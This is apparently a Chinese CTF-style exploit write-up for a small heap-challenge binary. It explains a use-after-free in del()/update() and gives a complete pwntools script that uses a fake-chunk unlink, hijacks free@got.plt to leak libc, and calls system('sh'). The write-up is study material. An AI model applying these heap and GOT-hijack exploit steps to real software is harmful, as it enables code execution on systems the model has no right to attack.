# 漏洞利用文档

- **程序类型**: ELF 64-bit LSB executable, x86-64架构
- **保护机制**:
  - Partial RELRO: GOT表可写，为GOT劫持提供条件
  - NX enabled: 堆栈不可执行，防止shellcode注入
  - Stack Canary: 栈保护开启，但漏洞在堆区域，不影响利用
  - No PIE: 代码段和全局变量地址固定，简化地址计算
- **依赖库**: 
  - 使用标准libc（通过`elf.libc`获取）
  - 动态链接，依赖ld-linux-x86-64.so.2
- **运行要求**: 
  - Linux环境
  - 需要相应的libc版本（从调试记录推断为glibc 2.23-2.27）
  - 程序路径：`./data/sample6`

## 漏洞成因
### 关键结构体分析
程序使用全局变量管理秘密，未显式定义结构体，但内存布局如下：
```c
// 全局变量区域 (0x6020d0)
uint64_t f_ptr;    // 指向小秘密的指针
uint64_t f_flag;   // 小秘密分配标志
uint64_t s_ptr;    // 指向大秘密的指针  
uint64_t s_flag;   // 大秘密分配标志
uint64_t q_ptr;    // 指向巨大秘密的指针
uint64_t q_flag;   // 巨大秘密分配标志
```

### 漏洞分析
**漏洞类型**: Use-After-Free (UAF)

**漏洞位置**: `del()`函数和`update()`函数的组合使用

**根本原因**:
1. **释放后未清空指针**：在`del()`函数中，释放内存后只将标志位置0，但未将指针设置为NULL：
   ```c
   case 1:
       free(f_ptr);    // 释放内存
       f_flag = 0;     // 但f_ptr仍然指向已释放的内存
       break;
   ```

2. **无效指针检查**：在`update()`函数中，只检查标志位而不验证指针有效性：
   ```c
   case 1:
       if(f_flag)      // 如果标志位为1（但指针可能已释放）
       {
           puts("Tell me your secret: ");
           read(0, f_ptr, BASE);  // 向已释放的内存写入数据
       }
       break;
   ```

**漏洞触发条件**:
- 用户分配小秘密或大秘密
- 调用`del()`删除该秘密（指针变为悬空指针）
- 调用`update()`更新秘密（向已释放内存写入）

**利用影响**: 通过UAF可以破坏堆元数据，实现任意地址读写，最终劫持GOT表执行任意代码。

## 漏洞利用过程
### 利用步骤与内存变化

| 步骤 | 操作 | 堆状态变化 | 全局变量变化 | GOT状态变化 | 关键内存地址 |
|------|------|------------|-------------|------------|-------------|
| 1 | `add(1,b'a');add(2,b'a');de(1)` | 分配小秘密(0x213992e0)和大秘密(0x21399310)，释放小秘密到fastbin | `f_ptr=0x213992f0`(悬空), `f_flag=1` | 无变化 | 堆基址: 0x21399000 |
| 2 | `add(3,b'a')` | 分配巨大秘密，堆布局调整 | `q_ptr`指向新chunk, `q_flag=1` | 无变化 | top chunk: 0x2139a2c0 |
| 3 | `de(1)` | 再次释放小秘密，强化UAF条件 | `f_ptr`仍指向已释放内存 | 无变化 | smallbin包含0x213992e0 |
| 4 | `add(1, fake_chunk)` | 重新分配小秘密，写入伪造chunk数据 | `f_ptr`指向伪造chunk数据区 | 无变化 | fake_chunk指向0x6020b8 |
| 5 | `de(2)` | 释放大秘密，触发unlink操作 | `s_ptr`变为悬空，全局变量被修改 | 无变化 | unlink修改f_ptr指向GOT |
| 6 | `update(1, f)` | 写入GOT地址到伪造chunk | `f_ptr`重定向到`free@got.plt`(0x602018) | 无变化 | GOT地址写入堆内存 |
| 7 | `update(1, p64(puts_plt))` | 覆盖free@got.plt为puts_plt | 无变化 | `free@got.plt=0x400760`(puts_plt) | 成功劫持free函数 |
| 8 | `de(2); p.recv(6)` | 触发puts泄漏libc地址 | 无变化 | 无变化 | 泄漏地址: 0x7f6992e3ae90 |
| 9 | `update(1, p64(system))` | 覆盖free@got.plt为system | 无变化 | `free@got.plt=system_addr` | libc_base=泄漏值-0x36e70 |
| 10 | `add(2, b'sh\0')` | 分配大秘密，内容为"sh" | `s_ptr`指向新chunk, `s_flag=1` | 无变化 | 准备system参数 |
| 11 | `de(2)` | 触发system("sh")执行 | 进程切换到/bin/sh | 无变化 | 成功获取shell |
| 12 | `p.interactive()` | 进入交互模式 | 完全控制shell | 无变化 | 利用完成 |

### 堆内存布局演变
```
初始状态:
0x21399000: [初始堆块]
0x213992e0: [小秘密chunk] - 分配 → 释放 → 重新分配(伪造)

利用后状态:
0x213992e0: [伪造chunk] → 指向GOT表
0x21399310: [大秘密chunk] → 存储"sh"字符串
```

### 关键bins状态变化
- **步骤1-3**: fastbin 0x30包含释放的小秘密chunk
- **步骤4**: smallbin包含伪造chunk，指向全局变量区域
- **步骤5后**: bins状态混乱，为任意地址分配创造条件
- **利用完成**: 所有bins为空，堆内存被重用

## Exploit
```python
from pwn import *
from LibcSearcher import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件
elf = ELF('./data/sample6')
p = process('./data/sample6')
libc = elf.libc  # 获取libc引用

# 关键地址定义（基于No PIE）
f_ptr = 0x6020d0  # 小秘密指针的全局变量地址
atoi_GOT = elf.got['atoi']    # atoi函数的GOT条目地址
free_GOT = elf.got['free']    # free函数的GOT条目地址  
puts_GOT = elf.got['puts']    # puts函数的GOT条目地址
puts_plt = elf.plt['puts']    # puts函数的PLT地址

# libc函数偏移量（需要根据实际libc版本调整）
atoi_offset = 0x36e70    # atoi函数在libc中的偏移
system_offset = 0x45380  # system函数在libc中的偏移

def add(t, s):
    """添加秘密功能封装"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'1')  # 选择添加功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 选择秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 输入秘密内容

def de(t):
    """删除秘密功能封装"""  
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'2')  # 选择删除功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 选择要删除的秘密类型

def update(t, s):
    """更新秘密功能封装"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'3')  # 选择更新功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 选择要更新的秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 输入新的秘密内容

# Step 1: 触发UAF漏洞 - 分配并释放小秘密，创建悬空指针
add(1, b'a')  # 分配小秘密
add(2, b'a')  # 分配大秘密  
de(1)         # 释放小秘密，但f_ptr未置NULL，创建UAF条件

# Step 2: 分配巨大秘密，改变堆布局
add(3, b'a')  # 分配巨大秘密，可能影响堆管理器状态

# Step 3: 再次释放小秘密（强化UAF条件）
de(1)  # 双重释放或重新释放，进一步破坏堆状态

# Step 4: 构造fake chunk并写入已释放内存
# 伪造chunk结构: [prev_size=0] [size=0x21] [fd=0x6020b8] [bk=0x6020c0] [data=0x20]
fake_chunk = p64(0) + p64(0x21) + p64(f_ptr - 0x18) + p64(f_ptr-0x10) + b'\x20'
add(1, fake_chunk)  # 重新分配小秘密，写入伪造的chunk数据

# Step 5: 释放大秘密，触发unlink操作修改全局指针
de(2)  # 释放大秘密，利用伪造chunk触发unlink，修改f_ptr指向GOT区域

# Step 6: 准备GOT地址数据并写入
# 构造数据: [padding] [atoi_GOT] [puts_GOT] [free_GOT] [flags=1,1,1]
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3
update(1, f)  # 更新小秘密，将GOT地址写入内存

# Step 7: 劫持free@got.plt为puts_plt
update(1, p64(puts_plt))  # 覆盖free的GOT条目为puts_plt，现在调用free实际执行puts

# Step 8: 触发puts泄漏libc地址
de(2)        # 调用free(实际是puts)泄漏内存内容
s = p.recv(6)  # 接收泄漏的6字节地址
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset  # 计算libc基地址
system = libc_base + system_offset  # 计算system函数地址

# Step 9: 覆盖free@got.plt为system函数
update(1, p64(system))  # 将free的GOT条目改为system地址

# Step 10: 分配大秘密，内容为"sh"字符串
add(2, b'sh\0')  # 分配大秘密，内容为"sh"，作为system的参数

# Step 11: 触发system("sh")执行
de(2)  # 调用free(实际是system)执行system("sh")，获取shell

# Step 12: 进入交互模式
p.interactive()  # 与获取的shell交互，完成利用
```

### 关键利用技术说明
1. **UAF利用**: 通过悬空指针向已释放内存写入伪造数据
2. **堆元数据破坏**: 构造fake chunk操纵堆管理器的行为
3. **Unlink攻击**: 利用unlink操作修改全局指针指向GOT表
4. **GOT劫持**: 覆盖GOT条目实现任意函数调用
5. **Libc泄漏**: 通过puts函数泄漏libc地址，计算system函数位置
6. **系统调用**: 最终调用system("sh")获取shell权限

该利用成功绕过了NX、Stack Canary等保护机制，实现了从普通用户权限到shell权限的提升。
